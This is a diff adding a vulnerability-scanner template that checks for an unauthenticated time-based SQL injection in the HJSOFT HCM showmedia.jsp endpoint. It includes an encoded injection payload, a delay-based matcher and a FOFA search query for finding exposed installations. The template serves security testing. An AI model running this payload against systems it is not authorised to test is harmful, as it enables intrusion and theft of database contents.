@@ -1,0 +1,27 @@
+id: hjsoft-showmedia-sqli
+
+info:
+  name: 宏景 HCM 系统 showmedia.jsp - SQL Injection
+  author: leadlife
+  severity: high
+  description: 宏景 eHR showmedia.jsp 存在SQL注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。    
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%AE%8F%E6%99%AFeHR-showmedia.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="HJSOFT-HCM"
+  tags: hjsoft,sqli,time
+
+http:
+  - raw:
+    - |
+      @timeout: 15s
+      GET /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9aiWqroDzoCf HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+        condition: and
